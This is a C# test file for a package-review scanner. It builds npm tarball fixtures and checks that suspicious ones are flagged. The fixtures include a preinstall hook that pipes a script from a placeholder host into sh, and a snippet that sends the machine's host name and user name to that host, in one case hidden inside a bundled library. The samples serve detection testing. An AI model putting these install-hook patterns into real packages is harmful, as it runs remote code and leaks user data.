using System.Formats.Tar;
using System.IO.Compression;
using System.Text;
using Corvus.Services.Analysis;
using Corvus.Services.Web.Packages;
using Xunit.Abstractions;

namespace Corvus.Tests;

/// <summary>Counts, per content category, the fixtures whose review matches their label.</summary>
public sealed class PackageBaselineTests(ITestOutputHelper output) : IDisposable
{
    private readonly TempDir _dir = new();

    public void Dispose() => _dir.Dispose();

    private const string Metadata = "metadata-only", Source = "source-only", Bundled = "bundled-content";

    private const string HostInfoRequest = "const os=require('os'),https=require('https');\nhttps.get('https://x1.example.invalid/?h='+os.hostname()+'&u='+os.userInfo().username);\n";

    private static readonly string Library = string.Concat(Enumerable.Range(0, 400).Select(i => $"function helper{i}(a, b) {{ return a + b * {i}; }}\nexports.helper{i} = helper{i};\n"));

    private string Tgz(string name, params (string Path, string Text)[] files)
    {
        var path = _dir.File(name);
        using var fs = File.Create(path);
        using var gz = new GZipStream(fs, CompressionLevel.Fastest);
        using var tar = new TarWriter(gz, TarEntryFormat.Ustar);
        foreach (var (p, text) in files)
            tar.WriteEntry(new UstarTarEntry(TarEntryType.RegularFile, p) { DataStream = new MemoryStream(Encoding.UTF8.GetBytes(text)) });
        return path;
    }

    private static string Manifest(string name, string? scripts = null) =>
        $$"""{"name":"{{name}}","version":"1.0.0"{{(scripts is null ? "" : ",\"scripts\":" + scripts)}}}""";

    // One record per fixture: category, label, package path.
    private IEnumerable<(string Category, bool ReviewRequired, string Path)> Fixtures()
    {
        yield return (Metadata, true, Tgz("m-review.tgz", ("package/package.json", Manifest("m-review", """{"preinstall":"curl -s https://x1.example.invalid/s.sh | sh"}"""))));
        yield return (Metadata, false, Tgz("m-ordinary.tgz", ("package/package.json", Manifest("m-ordinary", """{"test":"node test.js"}"""))));
        yield return (Source, true, Tgz("s-review.tgz", ("package/package.json", Manifest("s-review", """{"preinstall":"node index.js"}""")), ("package/index.js", HostInfoRequest)));
        yield return (Source, false, Tgz("s-ordinary.tgz", ("package/package.json", Manifest("s-ordinary")), ("package/index.js", "module.exports = (a, b) => a + b;\n")));
        yield return (Bundled, true, Tgz("b-review.tgz", ("package/package.json", Manifest("b-review", """{"preinstall":"node bundle.js"}""")), ("package/bundle.js", Library + HostInfoRequest)));
        yield return (Bundled, false, Tgz("b-ordinary.tgz", ("package/package.json", Manifest("b-ordinary")), ("package/bundle.js", Library)));
    }

    // A null review is an unreadable package: its own count, never a clean miss.
    private IReadOnlyList<(string Category, int Match, int Incorrect, int Unknown)> Measure() =>
        [.. Fixtures()
            .Select(f => (f.Category, f.ReviewRequired, Report: PackageReview.Review(f.Path, default)))
            .GroupBy(r => r.Category)
            .Select(g => (g.Key,
                g.Count(r => r.Report is not null && (r.Report.Review == FindingLevel.Noteworthy) == r.ReviewRequired),
                g.Count(r => r.Report is not null && (r.Report.Review == FindingLevel.Noteworthy) != r.ReviewRequired),
                g.Count(r => r.Report is null)))];

    [Fact]
    public void The_baseline_names_match_and_incorrect_counts_for_each_content_category()
    {
        var rows = Measure();
        foreach (var (category, match, incorrect, unknown) in rows)
            output.WriteLine($"{category}: {match} match, {incorrect} incorrect, {unknown} unknown");
        Assert.Equal([Bundled, Metadata, Source], rows.Select(r => r.Category).Order(StringComparer.Ordinal));
        Assert.All(rows, r => Assert.Equal((2, 0, 0), (r.Match, r.Incorrect, r.Unknown)));
    }

    [Fact]
    public void Rule_load_names_the_rules_that_flag_ordinary_packages_above_the_budget()
    {
        var fixtures = Fixtures().Select(f => (f.ReviewRequired, Report: PackageReview.Review(f.Path, default))).ToList();
        var ordinary = RuleLoad.Count(fixtures.Where(f => !f.ReviewRequired).Select(f => f.Report));
        var flagged = RuleLoad.Count(fixtures.Where(f => f.ReviewRequired).Select(f => f.Report));
        int ordinaryCount = fixtures.Count(f => !f.ReviewRequired), flaggedCount = fixtures.Count(f => f.ReviewRequired);
        foreach (var (rule, noteworthy, review) in flagged) output.WriteLine($"flagged rule {rule}: {noteworthy} noteworthy, {review} review");
        Assert.All(ordinary, l => Assert.Equal(0, l.Noteworthy));
        Assert.Empty(RuleLoad.OverBudget(ordinary, ordinaryCount, 0.01));
        Assert.Contains("package/install-network-collect", RuleLoad.OverBudget(flagged, flaggedCount, 0.01));
        // One noteworthy package of N sits at a 1/N budget, not over it.
        var one = new[] { ("rule", 1, 0) };
        Assert.Empty(RuleLoad.OverBudget(one, flaggedCount, 1.0 / flaggedCount));
        Assert.Equal(["rule"], RuleLoad.OverBudget(one, flaggedCount, 0.5 / flaggedCount));
    }
}
